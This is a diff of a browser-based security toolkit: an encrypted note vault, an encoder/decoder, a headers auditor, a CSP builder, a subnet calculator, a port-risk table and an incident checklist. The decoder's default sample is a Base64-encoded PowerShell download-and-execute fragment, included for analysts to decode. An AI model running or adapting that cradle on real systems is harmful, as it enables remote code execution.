+   <div class="stack"><div class="row"><h3 style="margin:0">Output</h3><span style="flex:1"></span><button class="btn ghost sm" id="vt-c">Copy</button></div><pre id="vt-out" style="min-height:120px"></pre>
+     <p class="muted small">AES-256-GCM with a key derived by PBKDF2-SHA256 (310,000 rounds) and a random salt and IV. Share the passphrase through a different channel than the ciphertext.</p></div></div></div>`;
+  let mode='e';const tabs=$$('.tab',root),o=$('#vt-out',root);
+  const set=m=>{mode=m;tabs.forEach(x=>x.setAttribute('aria-selected',x.dataset.t===m));$('#vt-go',root).textContent=m==='e'?'Encrypt':'Decrypt';$('#vt-l',root).textContent=m==='e'?'Secret text':'Encrypted text (starts with X09v1.)';o.textContent=''};
+  tabs.forEach(t=>t.onclick=()=>set(t.dataset.t));
+  const kdf=async(p,salt)=>crypto.subtle.deriveKey({name:'PBKDF2',salt,iterations:310000,hash:'SHA-256'},await crypto.subtle.importKey('raw',enc.encode(p),'PBKDF2',false,['deriveKey']),{name:'AES-GCM',length:256},false,['encrypt','decrypt']);
+  $('#vt-go',root).onclick=async()=>{const p=$('#vt-p',root).value,t=$('#vt-in',root).value;if(!p||!t){o.innerHTML=`<span class="s-crit">Enter both the text and a passphrase.</span>`;return}
+    if(mode==='e'&&p.length<10){o.innerHTML=`<span class="s-high">Use a passphrase of at least 10 characters. Try the Password Generator's passphrase mode.</span>`;return}
+    o.textContent='Working…';
+    try{if(mode==='e'){const salt=crypto.getRandomValues(new Uint8Array(16)),iv=crypto.getRandomValues(new Uint8Array(12));const ct=new Uint8Array(await crypto.subtle.encrypt({name:'AES-GCM',iv},await kdf(p,salt),enc.encode(t)));
+        const all=new Uint8Array(28+ct.length);all.set(salt);all.set(iv,16);all.set(ct,28);o.textContent='X09v1.'+bytesToB64(all)}
+      else{const b=b64ToBytes(t.trim().replace(/^X09v1\./,''));const pt=await crypto.subtle.decrypt({name:'AES-GCM',iv:b.slice(16,28)},await kdf(p,b.slice(0,16)),b.slice(28));o.textContent=dec.decode(pt)}}
+    catch{o.innerHTML=`<span class="s-crit">${mode==='d'?'Wrong passphrase, or the encrypted text was changed or cut off.':'Encryption failed.'}</span>`}};
+  $('#vt-c',root).onclick=e=>copy(o.textContent,e.target);
+  if(input){set('d');$('#vt-in',root).value=input}else $('#vt-in',root).value='Router admin: 192.168.1.1\nBreak-glass account: ops-emergency\nRecovery codes are in the safe.';
+}});
+
+T({id:'codec',cat:'Crypto & integrity',gl:'⇄',name:'Encoder / Decoder',desc:'Base64, URL, hex, HTML entities, binary, ROT13, Unicode escapes and IOC defanging.',render(root,input){
+  const C={b64e:['Base64 encode',s=>bytesToB64(enc.encode(s))],b64d:['Base64 decode',s=>dec.decode(b64ToBytes(s.replace(/\s/g,'')))],b64ue:['Base64URL encode',s=>b64url(enc.encode(s))],b64ud:['Base64URL decode',s=>dec.decode(b64urlToBytes(s.trim()))],
+    urle:['URL encode',encodeURIComponent],urld:['URL decode',s=>decodeURIComponent(s.replace(/\+/g,' '))],hexe:['Hex encode',s=>toHex(enc.encode(s))],
+    hexd:['Hex decode',s=>{const c=s.replace(/0x|[^0-9a-f]/gi,'');if(c.length%2)throw Error('Hex needs an even number of digits.');return dec.decode(new Uint8Array((c.match(/../g)||[]).map(x=>parseInt(x,16))))}],
+    htmle:['HTML entities encode',esc],htmld:['HTML entities decode',s=>{const t=document.createElement('textarea');t.innerHTML=s;return t.value}],
+    bine:['Binary encode',s=>[...enc.encode(s)].map(b=>b.toString(2).padStart(8,'0')).join(' ')],bind:['Binary decode',s=>dec.decode(new Uint8Array((s.match(/[01]{8}/g)||[]).map(b=>parseInt(b,2))))],
+    rot:['ROT13',s=>s.replace(/[a-z]/gi,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b)})],
+    unie:['Unicode escape',s=>[...s].map(c=>{const p=c.codePointAt(0);return p<128?c:p>0xffff?'\\u{'+p.toString(16)+'}':'\\u'+p.toString(16).padStart(4,'0')}).join('')],
+    unid:['Unicode unescape',s=>s.replace(/\\u\{([0-9a-f]+)\}|\\u([0-9a-f]{4})/gi,(m,a,b)=>String.fromCodePoint(parseInt(a||b,16)))],
+    def:['Defang IOCs',s=>s.replace(/https?:\/\/\S+|\b(?:[\w-]+\.)+[a-z]{2,}\b|\b\d{1,3}(?:\.\d{1,3}){3}\b/gi,defang)],ref:['Refang IOCs',refang]};
+  root.innerHTML=`<div class="stack"><div class="row"><label class="lbl" for="cd-op" style="margin:0">Operation</label><select id="cd-op" style="width:auto">${Object.entries(C).map(([k,v])=>`<option value="${k}">${v[0]}</option>`).join('')}</select><button class="btn ghost sm" id="cd-sw">⇅ Use output as input</button></div>
+    <div class="io"><div><label class="lbl" for="cd-in">Input</label><textarea id="cd-in" spellcheck="false"></textarea></div><div><div class="row" style="justify-content:space-between;margin-bottom:6px"><span class="lbl" style="margin:0">Output</span><button class="btn ghost sm" id="cd-c">Copy</button></div><pre id="cd-out" style="min-height:170px"></pre></div></div></div>`;
+  const inp=$('#cd-in',root),op=$('#cd-op',root),o=$('#cd-out',root);
+  function run(){try{o.textContent=C[op.value][1](inp.value);o.classList.remove('s-crit')}catch(e){o.textContent=e.message.includes('atob')||e.name==='InvalidCharacterError'?'Input is not valid for this decoder.':e.message;o.classList.add('s-crit')}}
+  inp.oninput=run;op.onchange=run;$('#cd-sw',root).onclick=()=>{inp.value=o.textContent;run()};$('#cd-c',root).onclick=e=>copy(o.textContent,e.target);
+  if(input){inp.value=input;op.value=/^[\w-]+$/.test(input)&&/[-_]/.test(input)?'b64ud':'b64d'}else{inp.value='cG93ZXJzaGVsbCAtZW5jIC1ub3AgLXcgaGlkZGVuIElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KQ==';op.value='b64d'}run();
+}});
+
+/* WEB & NETWORK */
+const SAMPLE_HEADERS=`HTTP/2 200
+server: nginx/1.18.0 (Ubuntu)
+x-powered-by: PHP/7.4.3
+content-type: text/html; charset=UTF-8
+set-cookie: session=8f2c1a9e; path=/
+set-cookie: theme=dark; path=/; Secure
+x-frame-options: SAMEORIGIN
+strict-transport-security: max-age=3600
+access-control-allow-origin: *`;
+T({id:'headers',cat:'Web & network',gl:'⛨',name:'Security Headers Audit',desc:'Grade a site\'s HTTP response headers and get exact fixes for what\'s missing.',render(root,input){
+  root.innerHTML=`<div class="stack"><div><label class="lbl" for="sh-in">Response headers. Get them with <code>curl -sI https://yoursite.com</code> or DevTools → Network → a request → Headers.</label><textarea id="sh-in" spellcheck="false"></textarea></div>
+    <div class="row"><button class="btn" id="sh-go">Audit headers</button></div><div id="sh-out" class="stack"></div></div>`;
+  const inp=$('#sh-in',root),out=$('#sh-out',root);
+  function run(){const H={},cookies=[];inp.value.split('\n').forEach(l=>{const m=l.match(/^([\w-]+):\s*(.*)$/);if(!m)return;const k=m[1].toLowerCase();if(k==='set-cookie')cookies.push(m[2]);else H[k]=m[2].trim()});
+    if(!Object.keys(H).length&&!cookies.length){out.innerHTML=errHTML('No headers found. Paste lines in the form "name: value".');return}
+    const f=[],fix=[];let score=100;const bad=(sev,title,detail,pts,fx)=>{f.push({sev,title,detail});score-=pts;if(fx)fix.push(fx)};const ok=t=>f.push({sev:'ok',title:t});
+    const hsts=H['strict-transport-security'];
+    if(!hsts)bad('high','Missing Strict-Transport-Security','Browsers can be downgraded to plain http on first visit.',20,'Strict-Transport-Security: max-age=63072000; includeSubDomains; preload');
+    else{const ma=+(hsts.match(/max-age=(\d+)/i)||[,0])[1];if(ma<15552000)bad('med',`HSTS max-age is only ${fmtDur(ma)}`,'Use at least 6 months (15552000); 2 years is recommended.',8,'Strict-Transport-Security: max-age=63072000; includeSubDomains; preload');else ok('HSTS enabled with a long max-age');if(!/includesubdomains/i.test(hsts))bad('low','HSTS does not cover subdomains','Add includeSubDomains.',3)}
+    const csp=H['content-security-policy'];
+    if(!csp)bad('high','Missing Content-Security-Policy','CSP is the main browser defense against cross-site scripting. Build one with the CSP Builder tool.',20,"Content-Security-Policy: default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'");
+    else{if(/'unsafe-inline'/.test(csp)&&!/nonce-|sha(256|384|512)-/.test(csp))bad('med',"CSP allows 'unsafe-inline'",'Inline scripts are allowed, which weakens XSS protection. Use nonces or hashes.',8);if(/'unsafe-eval'/.test(csp))bad('med',"CSP allows 'unsafe-eval'",'eval() and similar become usable by injected code.',6);if(/(script-src|default-src)[^;]*\s\*(\s|;|$)/.test(csp))bad('high','CSP allows scripts from any host (*)','The policy provides little protection.',12);if(f.every(x=>!x.title.startsWith('CSP')))ok('Content-Security-Policy present')}
+    if((H['x-content-type-options']||'').toLowerCase()!=='nosniff')bad('med','Missing X-Content-Type-Options: nosniff','Browsers may guess content types and run uploaded files as scripts.',8,'X-Content-Type-Options: nosniff');else ok('MIME sniffing disabled');
+    if(!H['x-frame-options']&&!/frame-ancestors/.test(csp||''))bad('med','No clickjacking protection','Add X-Frame-Options or CSP frame-ancestors so other sites cannot frame yours.',10,'X-Frame-Options: DENY');else ok('Clickjacking protection set');
+    if(!H['referrer-policy'])bad('low','Missing Referrer-Policy','Full URLs, including tokens in query strings, can leak to other sites.',5,'Referrer-Policy: strict-origin-when-cross-origin');else ok('Referrer-Policy set');
+    if(!H['permissions-policy'])bad('low','Missing Permissions-Policy','Restrict camera, microphone and location for your pages and any embeds.',4,'Permissions-Policy: camera=(), microphone=(), geolocation=()');else ok('Permissions-Policy set');
+    if(!H['cross-origin-opener-policy'])bad('low','Missing Cross-Origin-Opener-Policy','Isolates your window from pages it opens.',3,'Cross-Origin-Opener-Policy: same-origin');
+    if(H.server&&/\d/.test(H.server))bad('low',`Server version exposed: ${H.server}`,'Version numbers help attackers match known exploits. Hide them (nginx: server_tokens off).',4);
+    for(const k of['x-powered-by','x-aspnet-version','x-aspnetmvc-version'])if(H[k])bad('low',`${k} exposes ${H[k]}`,'Remove this header.',4);
+    if(H['access-control-allow-origin']==='*')bad(/true/i.test(H['access-control-allow-credentials']||'')?'high':'low','CORS allows any origin (*)','Fine for public APIs and assets. For anything behind a login, list allowed origins explicitly.',4);
+    cookies.forEach(c=>{const n=c.split('=')[0],miss=[];if(!/;\s*secure/i.test(c))miss.push('Secure');if(!/;\s*httponly/i.test(c))miss.push('HttpOnly');if(!/;\s*samesite/i.test(c))miss.push('SameSite');
+      if(miss.length)bad(/sess|auth|token|sid|jwt/i.test(n)&&miss.includes('HttpOnly')?'high':'med',`Cookie "${n}" is missing ${miss.join(', ')}`,'Session cookies need Secure; HttpOnly; SameSite=Lax (or Strict) so scripts cannot read them and they only travel over HTTPS.',/sess|auth|token/i.test(n)?8:3);else ok(`Cookie "${n}" has all security flags`)});
+    score=Math.max(0,score);const g=score>=95?'A+':score>=85?'A':score>=72?'B':score>=58?'C':score>=45?'D':'F';const sev={'A+':'ok',A:'ok',B:'med',C:'high',D:'high',F:'crit'}[g];
+    out.innerHTML=verdictHTML(g,sev,`Security headers grade ${g}`,`${score}/100 · ${f.filter(x=>x.sev!=='ok').length} issues`)+`<div class="io"><div class="stack"><h3>Findings</h3>${findingsHTML(f)}</div><div class="stack">${fix.length?`<div class="row"><h3 style="margin:0">Headers to add</h3><span style="flex:1"></span><button class="btn ghost sm" id="sh-c">Copy</button></div><pre>${esc(fix.join('\n'))}</pre>
+      <h3>Cloudflare Worker snippet</h3><pre id="sh-w">${esc('const res = await fetch(request);\nconst out = new Response(res.body, res);\n'+fix.map(x=>{const i=x.indexOf(':');return`out.headers.set('${x.slice(0,i)}', "${x.slice(i+2)}");`}).join('\n')+"\nout.headers.delete('X-Powered-By');\nreturn out;")}</pre>`:'<p class="muted">Nothing to add.</p>'}</div></div>`;
+    const c=$('#sh-c',out);if(c)c.onclick=e=>copy(fix.join('\n'),e.target)}
+  $('#sh-go',root).onclick=run;inp.value=input||SAMPLE_HEADERS;run();
+}});
+
+T({id:'csp',cat:'Web & network',gl:'⌘',name:'CSP Builder',desc:'Build a Content-Security-Policy directive by directive, with live warnings.',render(root){
+  const D=[['default-src',"'self'"],['script-src',"'self'"],['style-src',"'self' https://fonts.googleapis.com"],['img-src',"'self' data:"],['font-src',"'self' https://fonts.gstatic.com"],['connect-src',"'self'"],['frame-src',"'none'"],['object-src',"'none'"],['base-uri',"'self'"],['form-action',"'self'"],['frame-ancestors',"'none'"]];
+  root.innerHTML=`<div class="io"><div class="card stack">${D.map(([k,v])=>`<div><label class="lbl" for="cs-${k}">${k}</label><input id="cs-${k}" class="inp" value="${esc(v)}" spellcheck="false"></div>`).join('')}
+    <label class="check"><input type="checkbox" id="cs-up" checked> upgrade-insecure-requests</label><div><label class="lbl" for="cs-rep">Report endpoint (report-uri, optional)</label><input id="cs-rep" class="inp" placeholder="https://yoursite.com/csp-report"></div>
+    <label class="check"><input type="checkbox" id="cs-ro"> Report-only mode (test without blocking)</label></div>
+    <div class="stack"><div class="row"><h3 style="margin:0">HTTP header</h3><span style="flex:1"></span><button class="btn ghost sm" id="cs-c">Copy</button></div><pre id="cs-h"></pre>
+    <h3>HTML meta tag</h3><pre id="cs-m"></pre><p class="muted small">Meta tags ignore frame-ancestors, report-uri and report-only. Prefer the header.</p><h3>Warnings</h3><div id="cs-w"></div></div></div>`;
+  let head='';
+  function run(){const parts=[],w=[];D.forEach(([k])=>{const v=$('#cs-'+k,root).value.trim();if(v)parts.push(k+' '+v);
+      if(/script-src|default-src/.test(k)){if(/'unsafe-inline'/.test(v))w.push({sev:'high',title:`${k} allows 'unsafe-inline'`,detail:'Injected inline scripts will run. Use nonces or hashes instead.'});if(/'unsafe-eval'/.test(v))w.push({sev:'med',title:`${k} allows 'unsafe-eval'`});if(/(^|\s)(\*|https?:|data:)(\s|$)/.test(v))w.push({sev:'high',title:`${k} allows a whole scheme or any host`,detail:v})}});
+    if(!$('#cs-object-src',root).value.trim())w.push({sev:'med',title:"Set object-src 'none'",detail:'Blocks legacy plugins used for bypasses.'});
+    if(!$('#cs-base-uri',root).value.trim())w.push({sev:'med',title:'Set base-uri',detail:'Stops injected <base> tags from rewriting script URLs.'});
+    if($('#cs-up',root).checked)parts.push('upgrade-insecure-requests');const rep=$('#cs-rep',root).value.trim();if(rep)parts.push('report-uri '+rep);
+    const name=$('#cs-ro',root).checked?'Content-Security-Policy-Report-Only':'Content-Security-Policy';head=`${name}: ${parts.join('; ')}`;
+    $('#cs-h',root).textContent=head;$('#cs-m',root).textContent=`<meta http-equiv="Content-Security-Policy" content="${parts.filter(p=>!/^(frame-ancestors|report-uri)/.test(p)).join('; ')}">`;
+    $('#cs-w',root).innerHTML=w.length?findingsHTML(w):findingsHTML([{sev:'ok',title:'Policy looks tight'}])}
+  $$('input',root).forEach(i=>i.addEventListener('input',run));$('#cs-c',root).onclick=e=>copy(head,e.target);run();
+}});
+
+T({id:'subnet',cat:'Web & network',gl:'⌗',name:'Subnet Calculator',desc:'CIDR ranges, masks, host counts, IP scope, and whether an address is in range.',render(root,input){
+  root.innerHTML=`<div class="io"><div class="stack card"><div><label class="lbl" for="sn-in">IPv4 with prefix or mask</label><input id="sn-in" class="inp" spellcheck="false"></div>
+    <div><label class="lbl" for="sn-t">Is this address inside the range?</label><input id="sn-t" class="inp" placeholder="10.20.6.200" spellcheck="false"></div><div id="sn-tr"></div></div><div id="sn-out" class="stack"></div></div>`;
+  const inp=$('#sn-in',root);let cur=null;
+  function run(){try{const r=subnet(inp.value);cur=r;$('#sn-out',root).innerHTML=`<div class="card">${kvHTML({'Network':`<b>${r.network}/${r.prefix}</b>`,'Subnet mask':r.mask,'Wildcard (ACL)':r.wildcard,'First usable':r.first,'Last usable':r.last,'Broadcast':r.broadcast,'Usable hosts':r.hosts.toLocaleString('en-US'),'Total addresses':r.size.toLocaleString('en-US'),'Class':r.cls,'Scope':`<span class="${r.scope==='Public'?'s-med':'s-ok'}">${r.scope}</span>`})}</div><div><h3>Binary</h3><pre>IP    ${r.bin[0]}\nMask  ${r.bin[1]}</pre></div>`;test()}
+    catch(e){cur=null;$('#sn-out',root).innerHTML=errHTML(e.message);$('#sn-tr',root).innerHTML=''}}
+  function test(){const v=$('#sn-t',root).value.trim(),o=$('#sn-tr',root);if(!v||!cur){o.innerHTML='';return}const n=ipToInt(v);if(n===null){o.innerHTML=errHTML('Not a valid IPv4 address.');return}
+    o.innerHTML=n>=cur.netInt&&n<=cur.bcInt?`<div class="banner s-ok">${esc(v)} is inside ${cur.network}/${cur.prefix}</div>`:`<div class="banner s-med">${esc(v)} is outside ${cur.network}/${cur.prefix}</div>`}
+  inp.oninput=run;$('#sn-t',root).oninput=test;inp.value=input||'10.20.4.17/22';$('#sn-t',root).value='10.20.6.200';run();
+}});
+
+const PORTS=[[20,'TCP','FTP data','high','Cleartext file transfer. Replace with SFTP.'],[21,'TCP','FTP','high','Credentials sent in cleartext. Replace with SFTP or FTPS.'],[22,'TCP','SSH','med','Key-only auth, no root login, fail2ban or an allowlist.'],[23,'TCP','Telnet','crit','Cleartext remote shell. Disable it and use SSH.'],[25,'TCP','SMTP','med','Make sure it is not an open relay; require STARTTLS.'],[53,'TCP/UDP','DNS','med','Open resolvers are abused for amplification DDoS. Restrict recursion.'],[69,'UDP','TFTP','high','No authentication. Never expose to the internet.'],[80,'TCP','HTTP','low','Redirect everything to HTTPS.'],[110,'TCP','POP3','high','Cleartext mail login. Use POP3S (995).'],[111,'TCP/UDP','RPCbind','high','Leaks service info and is used in amplification. Block externally.'],[123,'UDP','NTP','med','Disable monlist; amplification risk.'],[135,'TCP','MS-RPC','high','Windows RPC. Never expose to the internet.'],[137,'UDP','NetBIOS','high','Leaks host and user info. Block at the edge.'],[139,'TCP','NetBIOS session','high','Legacy file sharing. Block at the edge.'],[143,'TCP','IMAP','high','Cleartext mail login. Use IMAPS (993).'],[161,'UDP','SNMP','high','Default "public" community strings leak config. Use SNMPv3.'],[389,'TCP/UDP','LDAP','high','Directory data and binds in cleartext. Use LDAPS and keep internal.'],[443,'TCP','HTTPS','low','Keep TLS 1.2+ only and check your headers.'],[445,'TCP','SMB','crit','Ransomware spreads through SMB (EternalBlue, WannaCry). Never expose.'],[465,'TCP','SMTPS','low','Encrypted mail submission.'],[587,'TCP','SMTP submission','low','Require auth and STARTTLS.'],[636,'TCP','LDAPS','med','Encrypted, but keep directory services internal.'],[873,'TCP','rsync','high','Often configured without auth. Restrict.'],[993,'TCP','IMAPS','low','Encrypted mail.'],[995,'TCP','POP3S','low','Encrypted mail.'],[1433,'TCP','Microsoft SQL Server','crit','Databases should never face the internet. Use a VPN or private network.'],[1521,'TCP','Oracle DB','crit','Keep internal.'],[1900,'UDP','SSDP / UPnP','med','Amplification and device discovery. Block at the edge.'],[2049,'TCP','NFS','high','File shares with weak auth. Keep internal.'],[2375,'TCP','Docker API (no TLS)','crit','Unauthenticated root on the host. Never expose; use 2376 with TLS or the socket.'],[3306,'TCP','MySQL / MariaDB','crit','Keep internal; bind to localhost or a private network.'],[3389,'TCP','RDP','crit','Top ransomware entry point. Put behind a VPN or gateway with MFA.'],[5432,'TCP','PostgreSQL','crit','Keep internal.'],[5900,'TCP','VNC','crit','Often weak or no password. Tunnel through SSH or a VPN.'],[5985,'TCP','WinRM (HTTP)','high','Remote PowerShell. Restrict to admin networks.'],[5986,'TCP','WinRM (HTTPS)','high','Restrict to admin networks.'],[6379,'TCP','Redis','crit','No auth by default; attackers write SSH keys through it. Bind to localhost.'],[8080,'TCP','HTTP alternate','med','Often dev servers or admin panels left exposed.'],[8443,'TCP','HTTPS alternate','med','Often admin consoles. Restrict access.'],[9200,'TCP','Elasticsearch','crit','Frequent source of mass data leaks. Enable auth, keep internal.'],[11211,'TCP/UDP','Memcached','crit','Record-setting DDoS amplification. Never expose.'],[27017,'TCP','MongoDB','crit','Frequent source of mass data leaks. Enable auth, keep internal.']];
+T({id:'ports',cat:'Web & network',gl:'⊞',name:'Port Risk Reference',desc:'What each common port is, how attackers abuse it, and how to lock it down.',render(root){
+  root.innerHTML=`<div class="stack"><div class="row"><input id="pt-q" class="inp grow" placeholder="Filter by port or service, e.g. 3389 or database" spellcheck="false"><select id="pt-r" style="width:auto"><option value="">All risk levels</option><option value="crit">Critical only</option><option value="high">High and above</option></select></div>
+    <div class="tbl-wrap"><table><thead><tr><th>Port</th><th>Service</th><th>Risk if public</th><th>Hardening</th></tr></thead><tbody id="pt-b"></tbody></table></div></div>`;
+  function run(){const q=$('#pt-q',root).value.toLowerCase().trim(),r=$('#pt-r',root).value;
+    const rows=PORTS.filter(p=>(!q||String(p[0]).startsWith(q)||(p[2]+' '+p[4]).toLowerCase().includes(q)||(q==='database'&&/sql|db|mongo|redis|elastic|postgres/i.test(p[2])))&&(!r||(r==='crit'?p[3]==='crit':['crit','high'].includes(p[3]))));
+    $('#pt-b',root).innerHTML=rows.map(p=>`<tr><td><b>${p[0]}</b><br><span class="muted small">${p[1]}</span></td><td>${p[2]}</td><td><span class="sev s-${p[3]}">${SEV_LABEL[p[3]]}</span></td><td class="muted">${p[4]}</td></tr>`).join('')||'<tr><td colspan="4" class="muted">No matching ports.</td></tr>'}
+  $('#pt-q',root).oninput=run;$('#pt-r',root).onchange=run;run();
+}});
+
+/* RESPONSE */
+const PLAYBOOK=[['Prepare',['Incident contacts (IT, leadership, legal, insurer) are current and reachable','Logs are centralized and kept at least 90 days','Offline backups were restore-tested in the last 90 days']],
+ ['Detect & analyze',['Record when it was first seen, who reported it, and how','Identify affected systems, accounts and data','Preserve evidence before changing anything: memory, disk images, logs','Rate severity and decide who must be told now','Start a timeline of every action taken, with times']],
+ ['Contain',['Isolate affected hosts from the network (do not power them off)','Disable or reset compromised accounts and revoke active sessions','Block malicious IPs, domains and file hashes at firewall, EDR and email gateway','Rotate exposed passwords, API keys and tokens']],
+ ['Eradicate',['Remove malware and persistence: scheduled tasks, services, run keys, cron jobs, new admin users','Patch the vulnerability that let the attacker in','Rebuild compromised systems from known-good images']],
+ ['Recover',['Restore data from clean backups and verify integrity','Return systems to production with the owner\'s sign-off','Watch restored systems closely for 30 days']],
+ ['Learn',['Hold a lessons-learned review within two weeks','Check notification duties: regulators, customers, insurer, law enforcement','Add detections for what was missed and update this playbook']]];
+T({id:'ir',cat:'Incident response',gl:'⚠',name:'Incident Playbook',desc:'Work an incident step by step (NIST SP 800-61 phases) and export a status report.',render(root){
+  const st=store('ir')||{name:'Phishing: finance credential theft',sev:'High',lead:'',done:{}};
+  root.innerHTML=`<div class="io"><div class="stack"><div class="card stack"><div><label class="lbl" for="ir-n">Incident</label><input id="ir-n" class="inp"></div>
+    <div class="row"><div class="grow"><label class="lbl" for="ir-s">Severity</label><select id="ir-s">${['Critical','High','Medium','Low'].map(s=>`<option>${s}</option>`).join('')}</select></div><div class="grow"><label class="lbl" for="ir-l">Incident lead</label><input id="ir-l" class="inp" placeholder="Name"></div></div>
+    <div><div class="row" style="justify-content:space-between"><span class="lbl" style="margin:0">Progress</span><span class="small" id="ir-p"></span></div><div class="bar" style="margin-top:6px"><i id="ir-b"></i></div></div></div>
+    ${PLAYBOOK.map(([ph,items],pi)=>`<div class="pb-phase"><h3>${pi+1} · ${ph}</h3>${items.map((it,ii)=>`<label class="pb-item" for="ir-${pi}-${ii}"><input type="checkbox" id="ir-${pi}-${ii}" data-k="${pi}-${ii}"><span>${esc(it)}</span></label>`).join('')}</div>`).join('')}
+    <div class="row"><button class="btn ghost sm" id="ir-reset">Reset checklist</button><span class="muted small" id="ir-rc"></span></div></div>
+    <div class="stack"><div class="row"><h3 style="margin:0">Status report</h3><span style="flex:1"></span><button class="btn ghost sm" id="ir-c">Copy report</button></div><pre id="ir-rep" style="max-height:none"></pre></div></div>`;
+  $('#ir-n',root).value=st.name;$('#ir-s',root).value=st.sev;$('#ir-l',root).value=st.lead;
+  $$('[data-k]',root).forEach(c=>{c.checked=!!st.done[c.dataset.k];c.closest('.pb-item').classList.toggle('done',c.checked)});
+  function run(){st.name=$('#ir-n',root).value;st.sev=$('#ir-s',root).value;st.lead=$('#ir-l',root).value;st.done={};
+    $$('[data-k]',root).forEach(c=>{if(c.checked)st.done[c.dataset.k]=1;c.closest('.pb-item').classList.toggle('done',c.checked)});store('ir',st);
+    const total=PLAYBOOK.reduce((a,p)=>a+p[1].length,0),n=Object.keys(st.done).length;$('#ir-p',root).textContent=`${n} of ${total} steps`;$('#ir-b',root).style.width=(n/total*100)+'%';
+    const phase=PLAYBOOK.find((p,pi)=>p[1].some((_,ii)=>!st.done[pi+'-'+ii]));
+    $('#ir-rep',root).textContent=`INCIDENT STATUS REPORT\n${'='.repeat(22)}\nIncident: ${st.name||'(unnamed)'}\nSeverity: ${st.sev}\nLead:     ${st.lead||'(unassigned)'}\nUpdated:  ${new Date().toLocaleString()}\nPhase:    ${phase?phase[0]:'Closed'} (${n}/${total} steps done)\n\n`+
+      PLAYBOOK.map(([ph,items],pi)=>`${ph.toUpperCase()}\n`+items.map((it,ii)=>`  [${st.done[pi+'-'+ii]?'x':' '}] ${it}`).join('\n')).join('\n\n')}
+  $$('input,select',root).forEach(x=>x.addEventListener('input',run));
+  let arm=false;$('#ir-reset',root).onclick=e=>{if(!arm){arm=true;e.target.textContent='Click again to clear all';$('#ir-rc',root).textContent='';setTimeout(()=>{arm=false;e.target.textContent='Reset checklist'},3000);return}
+    $$('[data-k]',root).forEach(c=>c.checked=false);arm=false;e.target.textContent='Reset checklist';$('#ir-rc',root).textContent='Checklist cleared.';run()};
+  $('#ir-c',root).onclick=e=>copy($('#ir-rep',root).textContent,e.target);run();
+}});
+
+/* ---------- shell ---------- */
+const nav=$('#nav'),view=$('#view'),rail=$('#rail'),scrim=$('#scrim');let current=null;
+function drawNav(filter=''){const f=filter.toLowerCase();const cats=[...new Set(TOOLS.map(t=>t.cat))];
+  nav.innerHTML=cats.map(c=>{const items=TOOLS.filter(t=>t.cat===c&&(!f||(t.name+' '+t.desc+' '+t.id).toLowerCase().includes(f)));return items.length?`<div class="grp"><h4>${c}</h4>${items.map(t=>`<a class="nav-a" href="#${t.id}" data-id="${t.id}"${t.id===current?' aria-current="page"':''}><span class="gl">${t.gl}</span>${t.name}</a>`).join('')}</div>`:''}).join('')||'<p class="muted small" style="padding:0 10px">No tool matches.</p>'}
+function go(id,input){const t=TOOLS.find(x=>x.id===id)||TOOLS[0];if(cleanup){cleanup();cleanup=null}current=t.id;
+  view.innerHTML=`<header class="vhead"><p class="kicker">${t.id==='console'?'whoami':t.cat.toLowerCase().replace(/ & | /g,'-')}</p><h1>${t.name}</h1><p class="lede">${t.desc}</p></header><div id="tool"></div>`;
+  try{t.render($('#tool'),input)}catch(e){$('#tool').innerHTML=errHTML('This tool failed to load: '+e.message)}
+  $('#cmd').textContent=t.id==='console'?'console':'run '+t.id;drawNav($('#q').value);closeRail();
+  if(location.hash.slice(1)!==t.id){try{history.replaceState(null,'','#'+t.id)}catch{location.hash=t.id}}window.scrollTo(0,0)}
+function openRail(){rail.classList.add('open');scrim.hidden=false}function closeRail(){rail.classList.remove('open');scrim.hidden=true}
+$('#menu').onclick=openRail;scrim.onclick=closeRail;
+nav.addEventListener('click',e=>{const a=e.target.closest('[data-id]');if(a){e.preventDefault();go(a.dataset.id)}});
+view.addEventListener('click',e=>{const a=e.target.closest('a.tool-card');if(a){e.preventDefault();go(a.getAttribute('href').slice(1))}});
+$('.brand').onclick=e=>{e.preventDefault();go('console')};
+$('#q').oninput=e=>drawNav(e.target.value);
+$('#q').onkeydown=e=>{if(e.key==='Enter'){const a=$('.nav-a',nav);if(a)go(a.dataset.id)}};
+document.addEventListener('keydown',e=>{if(e.key==='/'&&!/INPUT|TEXTAREA|SELECT/.test(document.activeElement.tagName)){e.preventDefault();openRail();$('#q').focus()}if(e.key==='Escape')closeRail()});
+addEventListener('hashchange',()=>{const id=location.hash.slice(1);if(id&&id!==current)go(id)});
+go(location.hash.slice(1)||'console');
+
+/* X09 Space physics, animated logo, clock, app switcher */
+X09Space.start({density:.8,solids:'[data-x09-solid],.topbar,.rail,.verdict,.console-box'});
+X09Space.logo($('#topLogo'),30);
+$('#toolCount').textContent=(TOOLS.length-1)+' tools · runs on-device';
+(function clk(){const d=new Date();$('#clock').textContent=d.toLocaleTimeString('en-US',{hour12:false});setTimeout(clk,1000-d.getMilliseconds())})();
+const swB=$('#swBtn'),swM=$('#swMenu');
+swB.onclick=e=>{e.stopPropagation();const o=swM.hidden;swM.hidden=!o;swB.setAttribute('aria-expanded',o)};
+document.addEventListener('click',e=>{if(!swM.hidden&&!e.target.closest('.x09-switch')){swM.hidden=true;swB.setAttribute('aria-expanded','false')}});
+$('.x09-switch-item.here').onclick=e=>{e.preventDefault();swM.hidden=true;go('console')};
+</script>
+
+</body>
+</html>
